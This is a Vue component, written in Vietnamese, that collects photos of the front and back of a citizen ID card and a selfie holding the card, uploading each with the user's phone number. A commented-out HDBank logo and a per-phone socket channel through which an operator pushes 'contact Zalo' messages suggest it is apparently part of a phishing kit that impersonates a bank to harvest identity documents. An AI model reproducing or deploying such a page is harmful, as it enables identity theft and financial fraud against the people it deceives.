<template>
    <div class="">
        <!-- <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div> -->
        <div style="margin-top: 20px">
            <v-row justify="center">
                <div style="display: flex; justify-content: center">
                </div>
                <v-col md="8" lg="6" cols="12" sm="12">
                    <v-card title="Ảnh CCCD mặt trước" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="ri-camera-line" clearable
                                @change="onFileChangeBefore">
                            </v-file-input>
                            <img :src="imagePreViewBefore" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-card title="Ảnh CCCD mặt sau" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="ri-camera-line" clearable
                                @change="onFileChangeAfter">
                            </v-file-input>
                            <img :src="imagePreViewAfter" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-card title="Ảnh chân dung cầm CCCD" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="ri-camera-line" clearable @change="onFileChange">
                            </v-file-input>
                            <img :src="imagePreView" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-btn color="warning" block class="mt-2" @click="submit">Tiếp tục</v-btn>
                </v-col>
            </v-row>
        </div>
        <v-dialog max-width="500px" v-model="dialogSuccess" persistent>
            <v-card>
                <!-- <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod"> -->
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- <v-select v-if="socketData.options" class="" v-model="formRefOtpMethod" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select> -->
                </v-card-text>
                <v-card-actions>
                    <v-btn color="blue" block class="pa-4" type="button" @click="dialogSuccess = false">Tiếp tục</v-btn>
                </v-card-actions>
                <!-- </v-form> -->
            </v-card>
        </v-dialog>
    </div>
</template>
<script setup>
import axios from '@/plugins/axios';
import { socket } from '@/plugins/socket';
import { computed, onMounted, ref } from 'vue';
import { useRouter } from 'vue-router';
import { useStore } from 'vuex';
const router = useRouter()
const store = useStore()
const user = computed(() => store.state.user)
const userStorage = JSON.parse(localStorage.getItem('user'))
const dialogSuccess = ref(false)
const dialogMessage = ref('')

const imagePreViewBefore = ref(null)
const imagePreViewAfter = ref(null)
const imagePreView = ref(null)
const formValue = ref({
    imageBefore: null,
    imageAfter: null,
    image: null
})
onMounted(() => {
    // if (!user.value.verified) {
    //     router.push({ name: 'Home' })
    // }

    socket.on(`send-data-user-${userStorage.numberPhone}`, async (data) => {
        console.log(data);
        if (data.type === 'zalo') {
            dialogSuccess.value = true
            dialogMessage.value = 'Vui lòng liên hệ zalo để được hỗ trợ.'
        }
    })
})

const onFileChangeBefore = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('imageBefore', file)
    formData.append('numberPhone', userStorage.numberPhone)
    axios.post('/upload-image-before', formData).then(res => {
        formValue.imageBefore = res.data
        userStorage.imageBefore = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreViewBefore.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}

const onFileChangeAfter = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('imageAfter', file)
    formData.append('numberPhone', userStorage.numberPhone)

    axios.post('/upload-image-after', formData).then(res => {
        formValue.imageAfter = res.data
        userStorage.imageAfter = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreViewAfter.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}

const onFileChange = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('image', file)
    formData.append('numberPhone', userStorage.numberPhone)

    axios.post('/upload-image', formData).then(res => {
        formValue.image = res.data
        userStorage.image = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreView.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}
const submit = () => {
    if (formValue.imageBefore === null || formValue.imageAfter === null || formValue.image === null) {
        store.commit('setSnackbar', {
            type: true,
            color: 'error',
            message: 'Vui lòng chọn đủ 3 ảnh.',
        })
        return
    }
    localStorage.setItem('user', JSON.stringify(userStorage))

    router.push({ name: 'information' })
}
</script>
<style>
.bg-gray {
    background-color: #f5f5f5;
}

body {
    background: #f2f2f4;
}

.v-card-item .v-card-title {
    padding: 0 0 0 0;
    font-size: 16px;
    font-weight: 500;
    color: #000;
    margin-bottom: 10px;
}

.v-field.v-field--appended.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}

label.v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
}

.v-card.v-theme--light.v-card--density-default.v-card--variant-elevated {
    border: 1px solid #ccc;
}



.v-field--center-affix .v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
    top: 50%;
}
</style>
